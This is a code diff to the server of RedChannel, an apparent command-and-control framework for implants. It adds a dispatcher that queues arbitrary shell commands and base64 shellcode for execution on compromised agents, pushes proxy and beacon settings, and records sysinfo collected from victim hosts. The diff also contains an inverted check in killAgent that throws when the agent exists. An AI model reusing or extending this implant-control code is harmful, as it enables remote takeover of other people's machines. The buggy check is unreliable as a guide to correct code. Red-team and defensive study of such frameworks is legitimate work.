@@ -14,7 +14,7 @@ import ProxyModule from "../modules/proxy";
 
 import * as implant from "../pb/implant";
 import * as c2 from "../pb/c2";
-import { DefaultConfig, RedChannelConfig } from "./config";
+import { DefaultConfig, ImplantModuleConfig, RedChannelConfig } from "./config";
 
 /*
 req: {
@@ -87,6 +87,7 @@ export type AgentModel = {
     sendq: SendQEntry[];
     // each agent has a map of dataId => chunks[]
     recvq: RecvQMap;
+    sysinfo?: implant.SysInfoData;
 };
 
 export type RedChannelModules = {
@@ -176,11 +177,14 @@ export default class RedChannel {
                 allowKeyx: false,
                 sendq: [],
                 recvq: new Map<DataId, DataChunk[]>(),
+                sysinfo: implant.SysInfoData.create({}),
             });
         }
     }
 
     killAgent(agentId: string) {
+        if (this.agents.has(agentId)) throw new Error(`agent '${agentId}' does not exist`);
+
         this.agents.delete(agentId);
     }
 
@@ -188,8 +192,47 @@ export default class RedChannel {
         this.sendCommandKeyx();
     }
 
+    sendAgentCommand(agentId: string, agentCommand: implant.AgentCommand, parameters?: string) {
+        switch (agentCommand) {
+            case implant.AgentCommand.SYSINFO:
+                this.sendCommandSysinfo(agentId);
+                break;
+            case implant.AgentCommand.EXECUTE:
+                if (!parameters?.length) throw new Error(`${implant.AgentCommand[implant.AgentCommand.EXECUTE]}: invalid command`);
+                this.sendCommandShell(agentId, parameters);
+                break;
+            case implant.AgentCommand.EXECUTE_SHELLCODE:
+                if (!parameters || !Constants.VALID_BASE64.test(parameters)) {
+                    throw new Error(`${implant.AgentCommand[implant.AgentCommand.EXECUTE_SHELLCODE]}: invalid base64 shellcode`);
+                }
+                this.sendCommandExecShellcode(agentId, Buffer.from(parameters, "base64"));
+                break;
+            case implant.AgentCommand.KEYX:
+                this.sendCommandKeyx(agentId);
+                break;
+            case implant.AgentCommand.SHUTDOWN:
+                this.sendCommandShutdown(agentId);
+                break;
+            case implant.AgentCommand.SET_CONFIG:
+                {
+                    let config: Partial<ImplantModuleConfig>;
+                    try {
+                        config = JSON.parse(parameters || "{}") as ImplantModuleConfig;
+                    } catch (e) {
+                        throw new Error(`${implant.AgentCommand[implant.AgentCommand.SET_CONFIG]}: invalid json config object (see implant in redchannel.conf)`);
+                    }
+                    this.sendCommandSetConfig(agentId, config);
+                }
+                break;
+            case implant.AgentCommand.MESSAGE:
+                if (!parameters?.length) throw new Error(`${implant.AgentCommand[implant.AgentCommand.MESSAGE]}: invalid message`);
+                this.sendCommandMessage(agentId, parameters);
+                break;
+        }
+    }
+
     /**
-     * Send keyx to an agent, broadcast it to all
+     * Send keyx to an agent or if no id broadcast it to all
      * @param agentId if null, we will broadcast keyx to all agents
      * @returns
      */
@@ -208,7 +251,7 @@ export default class RedChannel {
             // broadcast keyx if no agent is specified
             for (const id of this.agents.keys()) {
                 this.queueData(id, implant.AgentCommand.KEYX, uncompressedPublicKey).catch((ex) => {
-                    this.log.error(`error queueing data for agent ${id}: ${emsg(ex)}`);
+                    this.log.error(`error queueing data for agent(${id}) ${implant.AgentCommand[implant.AgentCommand.KEYX]}: ${emsg(ex)}`);
                 });
             }
             this.log.info("broadcasting keyx");
@@ -220,54 +263,61 @@ export default class RedChannel {
                 this.log.warn(`keyx started with agent ${agentId}`);
             })
             .catch((ex) => {
-                this.log.error(`error queueing data for agent ${agentId}: ${emsg(ex)}`);
+                this.log.error(`error queueing data for agent(${agentId}): ${emsg(ex)}`);
             });
         return;
+    }
+
+    sendCommandMessage(agentId: string, message: string) {
+        this.queueData(agentId, implant.AgentCommand.MESSAGE, Buffer.from(message)).catch((ex) => {
+            this.log.error(`error queueing data for agent(${agentId}) ${implant.AgentCommand[implant.AgentCommand.MESSAGE]}: ${emsg(ex)}`);
+        });
+    }
+
+    sendCommandShell(agentId: string, shellCommand: string) {
+        this.queueData(agentId, implant.AgentCommand.EXECUTE, Buffer.from(shellCommand)).catch((ex) => {
+            this.log.error(`error queueing data for agent(${agentId}) ${implant.AgentCommand[implant.AgentCommand.EXECUTE]}: ${emsg(ex)}`);
+        });
+    }
+
+    sendCommandExecShellcode(agentId: string, shellcode: Buffer) {
+        this.queueData(agentId, implant.AgentCommand.EXECUTE_SHELLCODE, shellcode).catch((ex) => {
+            this.log.error(`error queueing data for agent(${agentId}) ${implant.AgentCommand[implant.AgentCommand.EXECUTE_SHELLCODE]}: ${emsg(ex)}`);
+        });
     }
 
     sendCommandShutdown(agentId: string) {
         const secret = this.getAgent(agentId)?.secret;
         if (!secret) throw new Error(`missing agent ${agentId} secret, do you need to 'keyx'?`);
 
+        // agent must be able to decrypt the tag to execute shutdown
         this.queueData(agentId, implant.AgentCommand.SHUTDOWN, this.encryptPayload(crypto.randomBytes(6), secret)).catch((ex) => {
-            this.log.error(`error queueing data: ${emsg(ex)}`);
+            this.log.error(`error queueing data for agent(${agentId}) ${implant.AgentCommand[implant.AgentCommand.SHUTDOWN]}: ${emsg(ex)}`);
         });
     }
 
-    sendCommandShell(agentId: string, shellCommand: string) {
-        this.queueData(agentId, implant.AgentCommand.EXECUTE, Buffer.from(shellCommand)).catch((ex) => {
-            this.log.error(`error queueing data: ${emsg(ex)}`);
-        });
-    }
-
-    sendCommandExecShellcode(agentId: string, shellcode: Buffer) {
-        this.queueData(agentId, implant.AgentCommand.EXECUTE_SHELLCODE, shellcode).catch((ex) => {
-            this.log.error(`error queueing data: ${emsg(ex)}`);
-        });
-    }
-
-    sendConfigChanges(agentId: string) {
-        const configProto = implant.AgentConfig.create({});
-        if (this.config.implant.interval !== undefined) configProto.c2IntervalMs = { value: this.config.implant.interval };
-        if (this.config.implant.throttle_sendq !== undefined) configProto.throttleSendq = { value: this.config.implant.throttle_sendq };
-        if (this.config.implant.proxy_enabled !== undefined) configProto.useWebChannel = { value: this.config.implant.proxy_enabled };
-        if (this.config.implant.proxy_key !== undefined) configProto.webKey = { value: this.config.implant.proxy_key };
-        if (this.config.implant.proxy_url !== undefined) configProto.webUrl = { value: this.config.implant.proxy_url };
-
-        const configProtoBuffer = Buffer.from(implant.AgentConfig.toBinary(configProto));
-        // no need to send data, just the config proto
-        this.queueData(agentId, implant.AgentCommand.SET_CONFIG, configProtoBuffer).catch((ex) => {
-            this.log.error(`error queueing data: ${emsg(ex)}`);
-        });
-    }
-
-    // agent must be able to decrypt the tag to execute shutdown
     sendCommandSysinfo(agentId: string) {
         const secret = this.getAgent(agentId)?.secret;
         if (!secret) throw new Error(`missing agent ${agentId} secret, do you need to 'keyx'?`);
 
+        // agent must be able to decrypt the tag to execute shutdown
         this.queueData(agentId, implant.AgentCommand.SYSINFO, this.encryptPayload(crypto.randomBytes(6), secret)).catch((ex) => {
-            this.log.error(`error queueing data: ${emsg(ex)}`);
+            this.log.error(`error queueing data for agent(${agentId}): ${emsg(ex)}`);
+        });
+    }
+
+    sendCommandSetConfig(agentId: string, config: Partial<ImplantModuleConfig>) {
+        const configProto = implant.AgentConfig.create({});
+        if (config.interval !== undefined) configProto.c2IntervalMs = { value: Number(config.interval) || this.config.implant.interval };
+        if (config.throttle_sendq !== undefined) configProto.throttleSendq = { value: Boolean(config.throttle_sendq) || this.config.implant.throttle_sendq };
+        if (config.proxy_enabled !== undefined) configProto.useWebChannel = { value: Boolean(config.proxy_enabled) || this.config.implant.proxy_enabled };
+        if (config.proxy_key !== undefined) configProto.webKey = { value: config.proxy_key };
+        if (config.proxy_url !== undefined) configProto.webUrl = { value: config.proxy_url };
+
+        const configProtoBuffer = Buffer.from(implant.AgentConfig.toBinary(configProto));
+        // no need to send data, just the config proto
+        this.queueData(agentId, implant.AgentCommand.SET_CONFIG, configProtoBuffer).catch((ex) => {
+            this.log.error(`error queueing data for agent(${agentId}) ${implant.AgentCommand[implant.AgentCommand.SET_CONFIG]}: ${emsg(ex)}`);
         });
     }
 
@@ -282,6 +332,7 @@ export default class RedChannel {
     async queueData(agentId: string, command: implant.AgentCommand, data?: Buffer) {
         const agent = this.agents.get(agentId);
         if (!agent) throw new Error(`agent ${agentId} not found`);
+        if (!agent.secret) throw new Error(`missing agent ${agentId} secret, do you need to 'keyx'?`);
 
         const commandProto = implant.Command_Request.create({
             command: command,
@@ -813,6 +864,7 @@ export default class RedChannel {
                 }
 
                 if (!sysInfo.hostname) {
+                    this.log.error(`agent(${agentId}) sent invalid sysinfo:`, sysInfo);
                     return [
                         {
                             name: hostname,
@@ -822,17 +874,8 @@ export default class RedChannel {
                         },
                     ];
                 }
-
-                const displayRows = [
-                    ["hostname", sysInfo.hostname],
-                    ["ips", sysInfo.ip.join(",")],
-                    ["user", sysInfo.user],
-                    ["uid", sysInfo.uid],
-                    ["gid", sysInfo.gid],
-                ];
-
-                this.log.success(`agent(${agentId}) sysinfo>`);
-                this.log.displayTable([], displayRows);
+                this.agents.set(agentId, { ...this.agents.get(agentId)!, sysinfo: sysInfo });
+                this.log.success(`agent(${agentId}) sysinfo>`, sysInfo);
                 break;
             }
         }
